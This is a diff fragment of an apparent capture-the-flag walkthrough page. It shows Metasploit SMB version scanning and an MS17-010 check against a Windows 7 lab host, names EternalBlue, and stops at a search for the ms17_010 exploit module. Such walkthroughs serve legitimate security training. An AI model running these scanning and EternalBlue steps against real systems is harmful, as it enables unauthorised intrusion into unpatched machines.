@@ -15,6 +15,7 @@ host           port   proto  name               state  info
 10.10.47.219   <span style=color:#3677a9>49154</span>  tcp    msrpc              open   Microsoft Windows RPC
 10.10.47.219   <span style=color:#3677a9>49158</span>  tcp    msrpc              open   Microsoft Windows RPC
 10.10.47.219   <span style=color:#3677a9>49160</span>  tcp    msrpc              open   Microsoft Windows RPC
+
 </code></pre></div><p>On this machine we will focus on the <strong>SMB</strong> service which is on port <code>445</code>.</p><p>We can gather more information using the module
 <code>auxiliary/scanner/smb/smb_version</code>. Running it the services page will lock more
 like this.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>10.10.47.219  <span style=color:#3677a9>445</span>    tcp    smb                open   Windows <span style=color:#3677a9>7</span> Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional)
@@ -24,6 +25,7 @@ SMBv1.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020
 [+] 10.10.47.219:445      - 10.10.47.219 supports SMBv1 dialect.
 [*] 10.10.47.219:445      - Scanned <span style=color:#3677a9>1</span> of <span style=color:#3677a9>1</span> hosts (100% <span style=color:#24909d>complete</span>)
 [*] Auxiliary module execution completed
+
 </code></pre></div><p>As the machine name implies the box could be exploitable via <strong>EternalBlue</strong>.
 Since the machine has <strong>Windows 7</strong> installed and <strong>SMBv1</strong> enabled, it is most
 likely vulnerable. You can read more here
@@ -33,6 +35,7 @@ likely vulnerable. You can read more here
 [+] 10.10.47.219:445      - Host is likely VULNERABLE to MS17-010! - Windows <span style=color:#3677a9>7</span> Professional <span style=color:#3677a9>7601</span> Service Pack <span style=color:#3677a9>1</span> x64 (64-bit)
 [*] 10.10.47.219:445      - Scanned <span style=color:#3677a9>1</span> of <span style=color:#3677a9>1</span> hosts (100% <span style=color:#24909d>complete</span>)
 [*] Auxiliary module execution completed
+
 </code></pre></div><h2 id=gain-access>Gain Access</h2><p>Now we search for an exploit we can use in Metasploit.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>msf5 &gt; search ms17_010
 
 Matching <span style=color:#40ffff>Modules</span>
